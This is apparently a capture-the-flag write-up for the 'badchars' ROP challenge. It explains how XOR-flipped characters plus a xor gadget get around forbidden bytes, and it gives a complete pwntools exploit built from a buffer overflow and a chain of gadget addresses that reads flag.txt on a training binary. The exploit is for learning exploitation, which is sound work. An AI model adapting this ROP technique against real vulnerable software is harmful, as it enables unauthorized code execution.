## Badchars
### Writeup 
#### General Analysis
This challenge is the exact same as the previous challenge. However there are some characters, “badchars”, that we cannot use, being 'x', 'g', 'a' and '.'. This means that if we tried to use the same exploit as before, our "flag.txt" string would be malformed and the print_file() function wouldn’t work as intended.

#### Gameplan
Luckily, when we look at the gadgets under the useful label, we see that we can xor any byte in memory using the gadget:

> 0x00400628 xor byte [r15], r14b; ret

The appearance of this gadget solves our badchar problem as we can store the badchar xor’d in memory, then use this gadget to xor it again, thereby making the char in memory our intended one despite the badchar limitation.

Therefore, our complete gameplan is to load the string normally into a writable address, but with any badchars bitflipped, then use the xor gadget to flip them back - The process of which will be identical to the previous challenge + the bitflipping. The total payload is very large and I think it is more efficient to understand the solution by looking at the exploit below.

### Exploit
```
#! /bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./badchars")
libelf = ELF("./libbadchars.so")
p = elf.process()

# gadgets
load_arg1 = 0x00000000004006a3 # pop rdi ; ret
write_qword = 0x0000000000400634 # mov qword ptr [r13], r12 ; ret	
pop_12_to_15 = 0x000000000040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret	
xor_byte_gadget = 0x0000000000400628 # xor byte ptr [r15], r14b ; ret

# addresses
writable_address = 0x601038 
print_file = 0x00400510
trash = 0xdeadbeefdeadbeef
mask = 0xffffffffffffffff

# flag.txt str with bad chars bitflipped
string = int.from_bytes(b"".join([
	b"fl", # fl
	bytes([~ord("a") & 0xff]), # a
	bytes([~ord("g") & 0xff]), # g
	bytes([~ord(".") & 0xff]), # .
    b"t", # t 
	bytes([~ord("x") & 0xff]), # x
	b"t" # t
]), "little")

# useful gadget chains
load_str = flat(
	pop_12_to_15, 
	string, 
	writable_address, 
	trash, 
	trash, 
	write_qword
)

run_print_file = flat(
	load_arg1, 
	writable_address, 
	print_file
)

# xors the byte in an address 
# used to reverse the bitflipped bad chars in the string
def xor_gadget_chain(address): 
	return flat(
		pop_12_to_15,
		trash,
		trash,
		mask,
		address,
		xor_byte_gadget
	)

payload = flat(
	b"A" * 40,
	load_str,
	# bad chars are bit flipped in mem rn, so must flip them to be normal
	xor_gadget_chain(writable_address + 2),
	xor_gadget_chain(writable_address + 3),
	xor_gadget_chain(writable_address + 4),
	xor_gadget_chain(writable_address + 6),
	run_print_file
)

p.recvuntil(b"> ")
p.sendline(payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```